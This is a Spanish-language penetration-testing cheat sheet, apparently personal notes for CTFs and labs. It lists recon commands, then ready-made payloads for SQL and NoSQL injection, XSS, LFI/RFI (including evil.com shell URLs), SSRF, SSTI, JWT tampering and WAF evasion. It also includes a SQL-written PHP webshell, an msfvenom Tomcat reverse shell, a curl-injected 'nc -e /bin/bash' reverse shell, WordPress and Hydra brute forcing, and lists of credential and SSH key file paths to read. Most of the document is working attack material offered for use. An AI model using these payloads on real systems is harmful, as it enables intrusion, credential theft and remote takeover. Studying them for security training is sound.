## <font color="#245bdb">ENUMERACIÓN</font>

Si se tiene la ip o dominio pasar al paso 1, sino realizar netdiscover

```
netdiscover -i eth0 -r 192.168.0.0/24
```

Con nslookup, se puede obtener una ip a partir de un dominio

```
nslookup test.com
```
 
### <font color="#00b050">1. NMAP</font>

```
nmap -sC -sV -p- ip
```
**Nmap general


```
nmap -sV --script vuln -p22,80,443 ip
```
**Nmap principales puertos con escaneo de vulns


```
sudo nmap -sS -sV -p- --open --min-rate 5000 -n -Pn -vvv ip
```
Nmap mas o menos preciso y rápido. Con info sobre versiones.


```
sudo nmap -sS -sV --version-intensity 9 --script smtp-commands -p 25 -Pn ip
```
Nmap con versionado de SMTP



### <font color="#00b050">2. FEROXBUSTER</font>

```
feroxbuster -u http://ip/
```
Directorios rápido

### <font color="#00b050">2. GOBUSTER</font>

```
gobuster dir -u http://ip_o_dominio -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 100
```
**Gobuster general con lista medium (principal para ctfs)


```
gobuster dir -u http://dominio -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -k -x php,html,bak,txt
```
**Gobuster mas rápido y evitando errores de certificado


```
gobuster dir -u http://192.168.0.100:6969 \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
-x php,html,txt \
--exclude-length 647
```
**Gobuster por si la página devuelve 200 en directorios inválidos


Una vez encontrados directorios, se puede ejecutar para buscar dentro de esos directorios

```
gobuster dir -u http://ip_o_dominio/directorio -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

### <font color="#00b050">3. WFUZZ</font>
Una vez que hemos listado y verificado los directorios de gobuster, podemos pasar a la búsqueda de subdominios con wfuzz

```
wfuzz -c --hc 404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://ip/FUZZ
```


```
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://dominio" -H "Host: FUZZ.dominio" --hw 290
```

También podemos utilizar la herramienta para encontrar parámetros

```
wfuzz -c --hl=62 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://172.17.0.2/index.php?FUZZ=etc/passwd
```

### <font color="#00b050">4. SUBFINDER</font>
Encontrar subdominios (parecido wfuzz)
```
subfinder -d https://booking.com/ -all -recursive > subdomains1.txt
```

### <font color="#00b050">5. CRT.SH</font>
Más subdominios
```
curl -s "https://crt.sh/?q=%.booking.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > subdomain2.txt
```

### <font color="#00b050">6. NAABU</font>
Más subdominios
```
naabu -list subdomains.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt
```

### <font color="#00b050">7. KATANA</font>

```
katana -u subdomains_alive.txt -d 5 -kf -jc -fx -ef woff,pdf,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
```

### <font color="#00b050">8. SUBDOMINIOS VIVOS</font>


```
cat subdomains. txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
```

### <font color="#00b050">9. TESTINGS XSS</font>

```
cat allurls.txt | Gxss | grep -oP •^URL: \K\S+* | sed 'sF.*$H/ | sort -u > xss-txt
```

## <font color="#0070c0">IDENTIFICACIÓN Y EXPLOTACIÓN VULNERABILIDADES</font>

Apartado para las diferentes vulnerabilidades, y sus correspondientes técnicas de explotación.

### <font color="#00b050">SQL INJECTION</font>

Consiste en inyección de consultas SQL. Para detectarlo, podemos probar a poner caracteres especiales ( como una comilla '), si la aplicación devuelve mensajes de error la aplicación probablemente sea vulnerable a SQLI.

**Conocer la BDD actual**

```
test' UNION SELECT database()-- - 
```


**Conocer otras BDDS además de la actual**

```
' union select schema_name from information_schema.schemata-- -
```


**Listas las tablas de la BDD**

```
 ' union select table_name from information_schema.tables where table_schema="test"-- -
```


**Conocer las columnas de una tabla en la BDD**

```
' union select column_name from information_schema.columns where table_schema="test" and table_name="test"
```


**Blind injection (No recomendado, tarda mucho)**

```
' AND '1'='1
```


**Bypass login (-- sirve para evadir la validación username)**

```
administrator' --
```

**Password:

```
 loquesea
```


**Versión

```
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
```


**Para ver los detalles de una tabla

```
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
```


**Obtener usuarios y contraseñas

```
' UNION SELECT username, password+FROM+users--
```


<font color="#ff0000">PAYLOADS ÚTILES</font>

```
' OR '1
```

```
' OR 1 -- -
```

```
" OR "" = "
```

```
" OR 1 = 1 -- -
```

```
'='
```

```
'LIKE'
```

```
'=0--+
```


### <font color="#00b050">NOSQL INJECTION</font>

- HTTP data

```
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

   
- JSON data

```
{"username": {"$ne": null}, "password": {"$ne": null}}
```

```
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
```

```
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
```

```
{"username": {"$gt":""}, "password": {"$gt":""}}
```





### <font color="#00b050">XSS</font>

Esta vulnerabilidad permite a un atacante ejecutar código malicioso en la página web. Para comprobar si una página es vulnerable a XSS podemos intentar introducir código javascript

```
<script>alert("XSS")</script>
```

Si introducimos esto por ejemplo en una entrada de un blog, y la página es vulnerable, deberíamos ver lo siguiente al ver la entrada:

![[Pasted image 20251126235807.png]]

### <font color="#00b050">LFI</font>
Local file inclusion es una vulnerabilidad que consiste en poder acceder a archivos internos de la máquina. Principalmente funciona en webs hechas con php.

<font color="#ff0000">EJEMPLOS DE EXPLOTACION</font>
 **Double Encoding**

```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

**UTF-8 Encoding**

```
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
```

**Filter Bypass**

```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

**Info de usuarios:**

```
/etc/passwd
```


**Hashes de contraseñas:**

```
/etc/shadow
```


**Versión del SO:**

```
/etc/issue
```


**Grupos del sistema:**

```
/etc/group
```


**Nombre de host:**

```
/etc/hostname
```


**Versión del kernel:**

```
/proc/version
```


**Credenciales de la app:**

```
/var/www/html/config.php
```

  
**Credenciales de WordPress:**

```
/var/www/html/wp-config.php
```

  
**Configuración cliente SSH:**

```
/etc/ssh/ssh_config
```


**Configuración servidor SSH:**

```
/etc/ssh/sshd_config
```

  
**Clave privada SSH root:**

```
/root/.ssh/id_rsa
```

  
**Claves autorizadas de root:**

```
/root/.ssh/authorized_keys
```

  
**Claves de usuario:**

```
/home/user/.ssh/id_rsa
```


```
/home/user/.ssh/authorized_keys
```

### <font color="#00b050">RFI</font>
Remote file inclusion, es una vulnerabilidad que permite añadir archivos remotos desde nuestro equipo. No funciona por defecto en versiones posteriores a PHP 5.

<font color="#ff0000">EJEMPLOS DE EXPLOTACIÓN</font>

```
http://example.com/index.php?page=http://evil.com/shell.txt
```

**Null Byte

```
http://example.com/index.php?page=http://evil.com/shell.txt%00
```

**Double Encoding

```
http://example.com/index.php?page=http:%252f%252fevil.com%252fshell.txt
```

### <font color="#00b050">PATH TRAVERSAL</font>
Path traversal es una vulnerabilidad asociada a LFI y RFI. Permite poder navegar entre directorios internos de la máquina.

<font color="#ff0000">RUTAS ÚTILES</font>

SISTEMA OPERATIVO E INFO ÚTIL   

```
/etc/issue
/etc/group
/etc/hosts
/etc/motd
```

CONTRASEÑAS Y BD

```
/etc/passwd
/etc/mysql/my.cnf
```

### <font color="#00b050">SSRF</font>
Server-Side Request Forgery es una vulnerabilidad que permite que una aplicación web pueda hacer consultas HTTP del lado del servidor hacia un dominio elegido por el atacante.

<font color="#ff0000">EJEMPLOS DE EXPLOTACIÓN</font>

**Con localhost

```
http://localhost:80
http://localhost:22
https://localhost:443
```

**Con 0.0.0.0

```
http://0.0.0.0:80
http://0.0.0.0:22
https://0.0.0.0:443
```

### <font color="#00b050">RCE</font>

Remote Code Execution es una vulnerabilidad que permite ejecutar código malicioso de forma remota.

Parámetros comunes que podrían ser vulnerables a RCE: `exec, command, execute, ping, include, exclude, jump, code, reg, do, func, arg, option, load, process, step, read, function, req, feature, exe, module, payload, run, print, email, id, username, user, to, from, search, query, q, s, shopId, blogId, phone, mode, next, firstname, lastname, locale, cmd, sys, system`

<font color="#ff0000">  EJEMPLOS DE EXPLOTACIÓN</font>

```
|/usr/bin/id
```

```
;system('id')
```

```
`<?php eval("echo ".$_GET["user"].";"); ?>`
```

```
&& nc -lvvp 4444 -e /bin/sh &
```

```
;phpinfo()
```

```
;whoami
```

```
system('ls')
```


### <font color="#00b050">SSTI</font>
Server-Site Template Injection es una vulnerabilidad la cual permite inyectar código en una template nativa, para que luego se ejecute en el servidor.
Para comprobar si una página es vulnerable a SSTI, podemos intentar inyectar el siguiente código en por ejemplo un formulario:

```
{{7*7}}
```
**Jinja2 (Python)


```
#{7*7}
```
**Thymeleaf (Java)

Si al devolverlo, vemos 49, el servidor es vulnerable a SSTI

![[Pasted image 20251127142650.png]]

La escalabilidad de esta vulnerabilidad, consiste en poder ejecutar comandos.

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Si la página es vulnerable a SSTI, este comando nos permite ver el id del usuario (podemos cambiar el campo id por el que queramos visualizar)

<font color="#ff0000">MÁS EJEMPLOS DE EXPLOTACIÓN</font>

```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```


```
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
```


```
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

```  
{{process.env.USERNAME}}  
```  
**Ver el usuario actual

```  
{{process.cwd()}}  
```  
**Ver el directorio actual

```  
{{require('child_process').execSync('whoami').toString()}}  
```  
**Ejecutar comandos

### <font color="#00b050">FILE UPLOAD</font>
Esta vulnerabilidad permite subir un archivo malicioso debido a la falta o bypasseo del control de archivos. Su principal explotación es inyectar una shell en un archivo y luego ponerse en escucha para ejecutar comandos.

Para subir la shell, únicamente deberemos utilizar la siguiente: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Deberemos modificar los campos de ip por la nuestra propia y de puerto por 4444 para escuchar con netcat.

### <font color="#00b050">JWT</font>
Json Web Token es un estándar cuya función principal es crear tokens de acceso que permiten transmitir información normalmente dedicado a la identidad y privilegios o claims entre partes de forma segura.
Para explotar esta vulnerabilidad, podemos utilizar la siguiente herramienta: https://github.com/ticarpi/jwt_tool.git

<font color="#ff0000">EJEMPLOS DE EXPLOTACIÓN</font>

```
{
  "role": "admin"
}
```
**Claim manipulado


```
{
  `"exp": 9999999999`
}
```
**Probar validación de seguridad razonable


```
{
  `"role": "admin"`
}
```
**Probar roles


```
{
  `"unexpected": "value_test"`
}
```
**Campos inesperados


### <font color="#00b050">WORDPRESS</font>
Wordpress es el principl CMS más utilizado. Para conseguir vulnerar Wordpress, lo más útil de utilizar es wpscan: https://github.com/wpscanteam/wpscan
En Kali ya viene por defecto instalado. 

<font color="#ff0000">COMANDOS ÚTILES</font>

```
wpscan --url http://test.test/test --enumerate u
```
**Encontrar usuarios WordPress


```
wpscan --url <url> -U <user> -P <pass>
```
**Realizar fuerza bruta


```
wpscan --url http://192.168.0.37/wordpress -e p --plugins-detection aggressive
```
**Enumerar plugins de manera agresiva


```
nmap -p80 --script http-wordpress-enum --script-args http-wordpress-enum.root='/wordpress',search-limit=1000 ejemplo.com
```
**Enumerar plugins de WordPress con nmap


## <font color="#245bdb">HYDRA</font>

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt http://192.168.10.4:5000 http-post-form 'username=^USER^&password=^PASS^&action=login:Invalid credentials'
```


## <font color="#245bdb">WORDPRESS</font>

Enumerar Usuarios y Plugins con WordPress

```
wpscan --url http://10.10.123.20/wordpress/ -e u
```

BruteForcing

```
wpscan --url http://ip/ -U admin -P /usr/share/wordlists/rockyou.txt 
```

Cuando ya lo has bypasseado, puedes añadir una webshell en la template de 404


## <font color="#245bdb">TOMCAT</font>

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=4444 -f war -o revshell.war
```
Crear una shell y poderla subir a tomcat



## <font color="#245bdb">REVSHELL</font>
Bypassear php no permitido:
- Phtml
- Cambiar Content Type
- Doble extensión


## <font color="#245bdb">FTP</font>
Se puede conectar de manera anónima. user: anonymous pass: nada
Se utiliza para poder descargar archivos internos. ls --> Get nombre del archivo.
Se pueden descargar backups donde luego se pueden ver usuarios, contraseñas...

## <font color="#245bdb">STRCMP BYPASS</font>
En algunas versiones antiguas de PHP, se podía bypassear un login conociendo el usuario por lo siguiente:
![[Pasted image 20251215164723.png]]
strcmp compara dos strings. Si son iguales, devuelve 0. si le pasas un Array en lugar de un String a strcmp, la función devuelve NULL, y en PHP, NULL=TRUE. Por lo que de esta manera se puede bypassear


## <font color="#245bdb">Subir archivos mediante curl</font>

```
curl -H 'Content-Type: multipart/form-data' -F file='@php-reverse-shell.php' -F filename='/tmp/shell.php' http://<IP_VICTIMA>:<PUERTO>/file-upload
```


## <font color="#245bdb">403 BYPASS</font>

- https://github.com/v0rl0x/bypass-403-updated

- Cambiar la petición GET a POST

- Cambiar el Host



## <font color="#245bdb">TÉCNICAS EVASIÓN WAFS</font>

- **Capitalización:** 
```
<ScRlPT>confirm()</sCRlPt>
```

- **Ofuscación:** 
```
%3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F
```

- **Usando caracteres Unicode:** /?redir=http://google。com (Unicode alternative)

- **Comentarios, mix de técnicas, doble encoding…**


## <font color="#245bdb">SEARCHSPLOIT</font>

```
searchsploit servicio
```
Se utiliza para encontrar exploits para un servicio en específico.


```
searchsploit -m exploit
```
Con esto se puede copiar en nuestra máquina el exploit que seleccionemos.


## <font color="#245bdb">CREAR UNA WEBSHELL CON SQL INJECTION EN LA PÁGINA DEL SERVIDOR DE APACHE</font>


```
SELECT "<?php system($_GET['cmd']);?>" INTO OUTFILE "/var/www/html/webshell.php"
```


## <font color="#245bdb">COMPROBAR SI UN ENDPOINT DE API EN PYTHON ES VULNERABLE</font>

```
curl -i  http://192.168.148.117:50000/verify -X POST --data 'code=3*3'
```
Si devuelve 9, es vulnerable y por tanto se pueden ejecutar comandos.

![[Pasted image 20251231125319.png]]

Para ejecutar comandos explotando esta vulnerabilidad, deberemos hacer lo siguiente:

```
curl -i  http://192.168.148.117:50000/verify -X POST --data 'code=os.system("nc 192.168.45.225 18000 -e /bin/bash")'
```
(Cambiar ip y puerto)


## <font color="#245bdb">SSH</font>

```
ssh -p 43022 dademola@192.168.192.125
```
Conexión por SSH

```
ssh -o HostKeyALgorithms=+ssh-rsa user@192.168.35.129
```


## <font color="#245bdb">ESCALADA</font>

```
sudo env /bin/sh
```


## <font color="#245bdb">JOHN THE RIPPER</font>

Crackeo de hash

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
